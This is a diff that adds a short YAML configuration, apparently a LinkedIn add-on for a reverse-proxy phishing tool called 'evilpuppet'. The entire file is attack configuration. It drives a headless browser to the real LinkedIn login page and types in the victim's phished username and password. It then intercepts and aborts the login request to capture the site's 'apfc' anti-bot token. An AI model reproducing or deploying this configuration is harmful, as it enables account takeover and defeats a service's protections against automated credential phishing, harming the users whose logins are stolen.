@@ -1,0 +1,27 @@
+# evilpuppet add-on for target site
+
+evilpuppet:
+  triggers:
+    - domains: ['www.linkedin.com']
+      paths: ['/checkpoint/lg/login-submit']
+      token: 'apfc'
+      open_url: 'https://www.linkedin.com/login'
+      actions:
+        - selector: '#username'
+          value: '{username}'
+          enter: false
+          click: false
+          post_wait: 500
+        - selector: '#password'
+          value: '{password}'
+          enter: false
+          click: false
+          post_wait: 500
+        - selector: 'button[type=submit]'
+          click: true
+          post_wait: 1000
+  interceptors:
+    - token: 'apfc'
+      url_re: '/checkpoint/lg/login-submit'
+      post_re: 'apfc=([^&]*)'
+      abort: true
